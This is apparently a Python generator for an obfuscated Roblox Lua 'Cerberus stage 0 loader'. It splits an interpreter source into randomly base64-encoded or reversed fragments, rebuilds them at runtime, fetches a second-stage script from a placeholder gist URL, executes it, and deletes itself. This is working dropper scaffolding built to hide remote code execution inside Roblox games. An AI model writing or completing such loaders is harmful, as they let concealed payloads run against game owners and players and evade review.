import base64
import random

# The source code for the Lua-in-Lua VM/interpreter goes here.
# For this example, I'm using a simple placeholder. You will replace this
# with the full source of the interpreter we choose.
LUA_INTERPRETER_SOURCE = """
local function CustomLoad(source)
    -- This is where the full ~3000 lines of the Lua parser/compiler/interpreter would go.
    -- It's a placeholder for the real implementation.
    local func, err = loadstring(source)
    if not func then error(err) end
    return func
end
return CustomLoad
"""

def obfuscate_chunk(chunk):
    # Simple obfuscation layers. We can add more.
    roll = random.randint(1, 3)
    if roll == 1:
        # Base64 encode
        encoded = base64.b64encode(chunk.encode()).decode()
        return f'd(b("{encoded}"))' # 'd' for decode, 'b' for base64
    elif roll == 2:
        # Reverse string
        return f'r("{chunk[::-1]}")'
    else:
        # Just return as a plain string literal
        return f'"{chunk}"'

def generate_loader(source_code, chunk_size=15):
    chunks = [source_code[i:i+chunk_size] for i in range(0, len(source_code), chunk_size)]
    
    obfuscated_chunks = [obfuscate_chunk(chunk) for chunk in chunks]
    
    # The Lua script that will be generated
    loader_template = f"""
-- AUTO-GENERATED CERBERUS STAGE 0 LOADER
local b = game.HttpService.Base64Decode
local r = function(s) return s:reverse() end
local d = function(s) return s end -- Placeholder for more complex decryption if needed

local fragments = {{
    {', '.join(obfuscated_chunks)}
}}

local reconstructed_source = ""
for i = 1, #fragments do
    reconstructed_source = reconstructed_source .. fragments[i]
end

-- Construct and execute the loader in memory
local constructor, err = loadstring(reconstructed_source)
if constructor then
    local customLoader = constructor()
    if customLoader then
        -- Now use the reconstructed CustomLoad to fetch and run stage 1
        local url = "YOUR_RAW_GIST_URL_HERE"
        local success, stage1_source = pcall(game:GetService("HttpService").GetAsync, game:GetService("HttpService"), url)
        if success and stage1_source then
            local stage1_func, err2 = customLoader(stage1_source)
            if stage1_func then
                coroutine.wrap(stage1_func)()
            end
        end
    end
end

script:Destroy()
"""
    return loader_template

# Generate the final script
final_script = generate_loader(LUA_INTERPRETER_SOURCE)

# Save it to a file
with open("Initializer_generated.lua", "w") as f:
    f.write(final_script)

print("Generated Initializer_generated.lua successfully.")
print("Replace LUA_INTERPRETER_SOURCE with the full Lua-in-Lua code and run again.")
print("Then, copy the contents of the generated file into your Roblox script.")
